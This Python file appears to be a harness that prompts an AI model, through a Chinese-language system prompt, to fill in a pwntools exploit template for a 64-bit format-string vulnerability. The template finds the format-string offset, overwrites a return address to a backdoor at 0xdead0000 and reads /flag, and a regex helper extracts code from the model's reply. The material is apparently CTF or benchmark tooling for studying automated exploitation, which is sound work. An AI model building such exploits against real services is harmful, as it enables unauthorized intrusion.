import re

templete_py = """
# you can add more libraries if you need
from pwn import *

target = "{{TARGET}}" # DO NOT CHANGE, LEAVE IT AS IT IS
port = "{{PORT}}" # DO NOT CHANGE, LEAVE IT AS IT IS

p_factory = lambda: remote(target, int(port))  # noqa: E731


def exec_fmt(send):
    p = p_factory()
    # You can use your own logic to lead to the fmt vulnerability
    p.send(send)
    return p.recvall()


def exploit(offset: int):
    # Set up the connection to the target
    p = p_factory()

    # Receive the leak of payload address
    # leaked_address = p.recvline().strip()

    # Calculate the offset from the leak
    # You must think about the offset calculation carefully
    # write down you thought chain here
    # if you can't sure about the accurate offset, you can point out a range
    # and build a loop to find the right offset
    # leaked_payload_address = int(leaked_address, 16) + <OFFSET YOU CALCULATED, e.g. 248 - 32>

    # Generates payload using pwntools's fmtstr_payload
    # Overwrite return address to point to BACKDOOR_ADDRESS (0xdead0000)
    # payload = fmtstr_payload(
    #     offset, {leaked_payload_address: 0xDEAD0000}, numbwritten=0, write_size="short"
    # )

    # Send the payload
    # p.sendline(payload)

    # Send the command to read the flag
    p.sendline(b"cat /flag")

    # Receive and print the response
    response = p.recvuntil(b"}")
    print(response.decode(errors="ignore"))

    # Close the connection
    p.close()

context.arch = "amd64"

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
exploit(offset)
""".strip()  # noqa:E501


def system_prompt(line: int):
    return f"""下面将会给你一份含有格式化字符串漏洞的代码和其汇编结果（代码行数每行注释标出），已经分析出漏洞代码很可能出现在第 {line} 行。
你需要做的是 **仔细思考** 并编写一个 python 脚本利用这个漏洞覆盖返回地址为 backdoor（backdoor 的地址固定为 `0xdead0000`）后，读取/flag 文件。
这是你的模板攻击脚本，请填充，注意不要更改 target 和 port 模板变量。
```python
{templete_py}
```
值得你注意的内容：
- 输出直接是 python 脚本，使用 ``` 包裹
- 可能你需要传入一些其他参数能够让你走到有格式化字符串漏洞的逻辑
- 注意该程序是 64 位程序
""".strip()  # noqa:RUF001, E501


def extract_code(response: str) -> str | None:
    code = None
    for matched in re.finditer(
        r"^(?:(```+)\w*\s*)(?P<code>.+?)\s*\n\1$", response, re.MULTILINE | re.DOTALL
    ):
        code_block = matched["code"]
        code = (
            code_block.strip()
            if (code is None or len(code) < len(code_block))
            else code
        )
    return code
